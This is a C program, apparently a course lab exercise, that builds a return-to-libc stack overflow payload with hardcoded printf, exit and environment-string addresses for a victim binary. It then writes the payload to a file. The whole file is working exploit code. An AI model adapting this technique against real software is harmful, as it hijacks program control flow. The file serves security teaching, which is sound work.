#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cse543-util.h"


// Write 4-byte value to memory at location addr+offset
// You will use to write values into your payload - one 32-bit word at a time
#define pack(addr, offset, value)  (*((int **)(addr+offset)) = value)
#define OFFSET 76
#define PRINTF_OFFSET OFFSET 
#define printf_addr 0x08048824
#define EXIT_OFFSET (PRINTF_OFFSET + 4)
#define exit_addr   0x08048894 
#define ENV_OFFSET (EXIT_OFFSET + 4)
#define env_addr 0xffffdf9a

#define debug 1


int main(int argc, char **argv)
{
	/* Step 1: fill with x's up to return address */
	int i = 0;
	unsigned char buff[120];
	/* Step 1: fill with x's up to return address */

	while ( 1 ) {
 		if( i >= OFFSET ) break;
		buff[i] = 'x';
		i++;
	}


	/* Step 2: set address of return address */
	/* to first instruction address of malicious payload - printf@plt */
	#ifdef debug
	printf("PRINTF_OFFSET :  %d\n", PRINTF_OFFSET);	
	printf("PRINTF_OFFSET :  %x\n", printf_addr);	
	#endif

	int *res_0 = pack(buff, PRINTF_OFFSET, printf_addr);

        /* Step 3: Prepare rest of stack to invoke printf */
	/* to address of string on stack - in env variable ZZYZX - and exit cleanly */
	#ifdef debug
	printf("EXIT_OFFSET : %d\n", EXIT_OFFSET);	
	printf("EXIT_OFFSET : %x\n", exit_addr);	
	#endif

	int *res_1 = pack(buff, EXIT_OFFSET, exit_addr);

	#ifdef debug
	printf("ENV_OFFSET :  %d\n", ENV_OFFSET);	
	printf("ENV_OFFSET :  %x\n", env_addr);	
	#endif

	int *res_2 = pack(buff, ENV_OFFSET, env_addr + 6);

	/* Step 4: Write payload for input as input_domain of victim */
	/* see cse543-util.c for write_to_file code */
	int buff_size = ENV_OFFSET + strlen("Hello, WORLD\!") + 1;
	write_to_file( "env-payload", buff, buff_size, FILE_CLEAR );

	/* Example of writing payload to file - append */
	/* input as input_passwd of victim */
	write_to_file( "env-payload", "\npassword\n", 10, FILE_APPEND);

	exit(0);
}

